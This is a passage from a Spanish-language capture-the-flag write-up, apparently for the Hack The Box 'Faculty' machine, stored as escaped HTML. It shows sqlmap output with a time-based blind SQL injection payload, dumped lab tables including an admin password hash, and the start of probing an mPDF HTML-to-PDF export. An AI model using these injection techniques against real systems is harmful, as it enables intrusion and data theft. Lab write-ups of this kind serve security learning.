&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;injection not exploitable with NULL values. Do you want to try with a random integer value for option &amp;#39;&lt;/span&gt;--union-char&lt;span class=&#34;s1&#34;&gt;&amp;#39;? [Y/n] Y
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[18:07:35] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. &amp;#39;&lt;/span&gt;--dbms&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;mysql&lt;span class=&#34;s1&#34;&gt;&amp;#39;)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[18:07:37] [INFO] target URL appears to be UNION injectable with 10 columns
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;injection not exploitable with NULL values. Do you want to try with a random integer value for option &amp;#39;&lt;/span&gt;--union-char&lt;span class=&#34;s1&#34;&gt;&amp;#39;? [Y/n] Y
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[18:07:43] [INFO] checking if the injection point on POST parameter &amp;#39;&lt;/span&gt;id_no&lt;span class=&#34;s1&#34;&gt;&amp;#39; is a false positive
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;POST parameter &amp;#39;&lt;/span&gt;id_no&lt;span class=&#34;s1&#34;&gt;&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;sqlmap identified the following injection point(s) with a total of 238 HTTP(s) requests:
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;---
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Parameter: id_no (POST)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;    Type: time-based blind
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;    Payload: id_no=1234567&amp;#39;&lt;/span&gt; AND &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SELECT &lt;span class=&#34;m&#34;&gt;9190&lt;/span&gt; FROM &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SELECT&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SLEEP&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;5&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;gAAt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; AND &lt;span class=&#34;s1&#34;&gt;&amp;#39;rpgO&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;rpgO
---
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;18:07:59&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0, PHP
back-end DBMS: MySQL &amp;gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 5.0.12
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;18:07:59&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; fetching database names
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;18:07:59&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; fetching number of databases
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;18:07:59&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; resumed: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;18:07:59&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; resumed: information_schema
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;18:07:59&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; resumed: scheduling_db
available databases &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; information_schema
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; scheduling_db

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener la información de la base de datos, encontramos las credenciales del administrador, además los &amp;ldquo;codigos&amp;rdquo; de ingreso de tres diferentes usuarios e información de cursos y temas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Database: scheduling_db
Table: faculty
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; entries&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id_no    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; email              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; gender &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; address             &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; contact        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; lastname &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; firstname &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; middlename &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;63033226&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; jsmith@faculty.htb &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Male   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;151&lt;/span&gt; Blue Lakes Blvd &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;646&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 559-9192 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Smith    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; John      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; C          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;85662050&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cblake@faculty.htb &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Female &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;225&lt;/span&gt; Main St         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;763&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 450-0121 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Blake    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Claire    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; G          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;30903070&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ejames@faculty.htb &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Male   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;142&lt;/span&gt; W Houston St    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;702&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 368-3689 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; James    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Eric      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; P          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+

Database: scheduling_db
Table: users
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; entry&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+----+---------------+------+----------------------------------+----------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; name          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; password                         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; username &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+---------------+------+----------------------------------+----------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Administrator &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 1fecbe762af147c1176a0fc2c722a345 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; admin    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+---------------+------+----------------------------------+----------+

Database: scheduling_db
Table: class_schedule_info
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; entries&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+----+-----------+-------------+---------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; course_id &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; schedule_id &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; subject &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+-----------+-------------+---------+
+----+-----------+-------------+---------+

Database: scheduling_db
Table: subjects
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; entries&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+----+-----------------------------------------------------------------------------------------------------------------------------------+----------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; subject                                                                                                                           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; description                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+-----------------------------------------------------------------------------------------------------------------------------------+----------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; DBMS                                                                                                                              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Database Management System &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Mathematics                                                                                                                       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Mathematics                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; English                                                                                                                           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; English                    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Computer Hardware                                                                                                                 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Computer Hardware          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; History                                                                                                                           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; History                    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+-----------------------------------------------------------------------------------------------------------------------------------+----------------------------+

Database: scheduling_db
Table: courses
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; entries&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+----+------------------------+---------------------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; course                 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; description                                 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+------------------------+---------------------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Information Technology &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; IT                                          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; BSCS                   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Bachelor of Science in Computer Science     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; BSIS                   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Bachelor of Science in Information Systems  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; BSED                   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Bachelor in Secondary Education             &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+------------------------+---------------------------------------------+

Database: scheduling_db
Table: schedules
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; entry&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+----+------------+--------------------+----------+----------+-----------+-------------+---------------------+--------------+---------------+---------------+-------------------------------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; faculty_id &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; title              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; time_to  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; location &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; time_from &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; description &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; date_created        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; is_repeating &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; schedule_date &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; schedule_type &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; repeating_data                                        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+------------+--------------------+----------+----------+-----------+-------------+---------------------+--------------+---------------+---------------+-------------------------------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Class &lt;span class=&#34;m&#34;&gt;101&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;M &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; Th&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 12:00:00 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Online   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 09:00:00  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Sample Only &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 2020-10-20 15:51:01 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;            &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 0000-00-00    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;             &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dow&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;1,4&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;start&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;2020-10-01&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;end&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;2020-11-30&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+------------+--------------------+----------+----------+-----------+-------------+---------------------+--------------+---------------+---------------+-------------------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El usuario de la base de datos unicamente tiene el privilegio USAGE por lo que no podemos hacer nada por aquí.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;database management system users privileges:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; %sched% &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:
    privilege: USAGE
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;user---gbyolo&#34;&gt;User - Gbyolo&lt;/h1&gt;
&lt;h2 id=&#34;html-to-pdf&#34;&gt;HTML to PDF&lt;/h2&gt;
&lt;p&gt;Encontramos que el sitio web puede exportar archivos PDF con la información de los cursos, temas, etc. del sitio web.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/faculty/Screenshot_20220719_162857.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Si observamos la solicitud realizada por el sitio, vemos que envia contenido codificado a download.php.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/faculty/Screenshot_20220719_163042.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El contenido tiene codificación doble en URL y codificaciín en base64. Se muestra contenido HTML.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/faculty/Screenshot_20220719_163145.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Enviamos un tag h1 codificado de la misma forma, logramos generar un pdf con su contenido.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/faculty/Screenshot_20220719_163507.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Si observamos la url se muestra el texto &amp;ldquo;mpdf&amp;rdquo;, tras ejecutar feroxbuster en este directorio podríamos decir que se trata de la libreria &lt;a href=&#34;https://mpdf.github.io/&#34;&gt;mPDF&lt;/a&gt;, si observamos los &lt;a href=&#34;https://mpdf.github.io/getting-started/html-or-php.html&#34;&gt;ejemplos&lt;/a&gt; se muestra contenido html para generar un PDF.&lt;br /&gt;
&lt;div class=&#34;expand&#34;&gt;
  &lt;button type=&#34;button&#34; class=&#34;expand__button&#34; aria-label=&#34;Expand Button&#34;&gt;
    &lt;span class=&#34;expand-icon expand-icon__right&#34;&gt;
        &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;24&#34; height=&#34;24&#34; viewBox=&#34;0 0 24 24&#34;&gt;&lt;path fill=&#34;currentColor&#34; d=&#34;M9.29 15.88L13.17 12 9.29 8.12c-.39-.39-.39-1.02 0-1.41.39-.39 1.02-.39 1.41 0l4.59 4.59c.39.39.39 1.02 0 1.41L10.7 17.3c-.39.39-1.02.39-1.41 0-.38-.39-.39-1.03 0-1.42z&#34;/&gt;&lt;/svg&gt;
    &lt;/span&gt;
    mpdf feroxbuster
  &lt;/button&gt;
  &lt;div class=&#34;expand__content&#34;&gt;
    &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
